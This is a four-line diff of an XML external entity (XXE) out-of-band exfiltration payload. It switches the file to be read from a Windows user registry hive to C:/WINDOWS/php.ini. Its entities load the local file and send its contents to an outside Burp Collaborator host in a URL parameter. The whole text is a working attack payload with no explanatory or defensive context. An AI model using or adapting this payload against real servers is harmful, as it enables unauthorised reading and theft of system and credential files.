@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///C:/Users/Administrator/NTUser.dat">
+<!ENTITY % file SYSTEM "file:///C:/WINDOWS/php.ini">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://e4j5loxf8h8z38cx5q9vuj5e258ywn.burpcollaborator.net/?x=%file;'>">
 %eval;
 %exfiltrate;
